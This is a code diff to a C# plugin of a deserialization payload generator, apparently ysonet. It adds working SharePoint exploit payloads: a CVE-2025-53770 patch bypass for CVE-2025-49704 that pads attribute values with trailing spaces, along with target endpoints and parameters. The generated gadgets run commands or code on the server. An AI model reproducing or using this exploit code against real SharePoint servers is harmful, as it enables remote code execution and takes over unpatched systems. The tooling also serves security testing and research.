@@ -109,16 +109,24 @@ namespace ysonet.Plugins
                                 "\r\n The payload needs to be sent (POST request) in the __SUGGESTIONSCACHE__ parameter to /_layouts/15/quicklinks.aspx?Mode=Suggestion or /_layouts/15/quicklinksdialogform.aspx?Mode=Suggestion " +
                                 "\r\n-->";
                     break;
+                case "cve-2024-38018":
+                    payload = CVE_2024_38018();
+                    payload += "\r\n\r\n<!--\r\n The payload can be sent to any page supporting webparts such as /_vti_bin/webpartpages.asmx" +
+                                "\r\n-->";
+                    break;
                 case "cve-2025-49704":
-                    payload = CVE_2025_49704();
+                    payload = CVE_2025_49704(false);
                     payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
                                 "https://blog.viettelcybersecurity.com/sharepoint-toolshell/" +
                                 "\r\n The payload needs to be sent in the MSOTlPn_DWP parameter to /_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx" +
                                 "\r\n-->";
                     break;
-                case "cve-2024-38018":
-                    payload = CVE_2024_38018();
-                    payload += "\r\n\r\n<!--\r\n The payload can be sent to any page supporting webparts such as /_vti_bin/webpartpages.asmx" +
+                case "cve-2025-53770":
+                    // cve-2025-49704 patch bypass
+                    payload = CVE_2025_49704(true);
+                    payload += "\r\n\r\n<!--\r\nView the following link for more details about the request: \r\n" +
+                                "https://blog.viettelcybersecurity.com/sharepoint-toolshell/" +
+                                "\r\n The payload needs to be sent in the MSOTlPn_DWP parameter to /_layouts/15/ToolPane.aspx/?DisplayMode=Edit&foo=/ToolPane.aspx" +
                                 "\r\n-->";
                     break;
             }
@@ -249,7 +257,7 @@ namespace ysonet.Plugins
             return final_payload_template.Replace("{serializedPayload}", serializedPayload);
         }
 
-        public string CVE_2025_49704()
+        public string CVE_2025_49704(bool useBypass)
         {
             InputArgs inputArgs = new InputArgs();
             inputArgs.Cmd = command;
@@ -268,11 +276,20 @@ runat=""server"">
 </ProgressTemplate>
 </asp:UpdateProgress>";
 
+            if (useBypass)
+            {
+                // Adding a trailing space (other whitespaces might also work)
+                final_payload_template = final_payload_template.Replace(@"Namespace=""Microsoft.PerformancePoint.Scorecards""", @"Namespace=""Microsoft.PerformancePoint.Scorecards """);
+
+                // Adding a trailing space (other whitespaces might also work), space could also be a prefix
+                final_payload_template = final_payload_template.Replace(@"Tagprefix=""ScorecardClient""", @"Tagprefix=""ScorecardClient """);
+            }
+
             byte[] payload_bytes;
 
             if (variant == 2)
             {
-                // Variant 2: Use GadgetHelper to create DataSetOldBehaviourFromFileGenerator variant 2
+                // Variant 2: Use GadgetHelper to create DataSetOldBehaviourFromFileGenerator variant 2 (run code)
                 IGenerator dsFromFileGenerator = GadgetHelper.CreateGadgetInstance("DataSetOldBehaviourFromFile");
                 if (dsFromFileGenerator == null)
                 {
@@ -288,7 +305,7 @@ runat=""server"">
             }
             else
             {
-                // Variant 1 (default): Use GadgetHelper to create DataSetOldBehaviourGenerator variant 2
+                // Variant 1 (default): Use GadgetHelper to create DataSetOldBehaviourGenerator variant 1 (run command)
                 IGenerator dsGenerator = GadgetHelper.CreateGadgetInstance("DataSetOldBehaviour");
                 if (dsGenerator == null)
                 {
